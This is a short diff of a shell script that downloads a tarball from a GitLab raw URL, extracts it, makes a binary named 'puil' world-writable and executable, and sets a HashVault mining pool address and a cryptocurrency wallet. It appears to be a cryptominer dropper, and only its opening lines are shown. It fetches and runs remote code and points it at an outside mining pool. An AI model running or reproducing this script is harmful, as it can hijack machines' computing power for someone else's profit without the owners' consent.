@@ -1,4 +1,5 @@
-wget https://gitlab.com/ilhamjaya0q/beben/-/raw/main/ccx.tar.gz && tar -xvf ccx.tar.gz
+wget https://gitlab.com/ilhamjaya0q/beben/-/raw/main/ccx.tar.gz 
+tar -xvf ccx.tar.gz
 chmod 777 puil
 A=pool.hashvault.pro:80
 B=ccx7JstR2Z1HALi1janyTwhg42WenPU1hBpi6xmuQATW1sqQeawgVDdXtznxBsofFP8JB32YYBmtwLdoEirjAbYo4DBZjX5epC
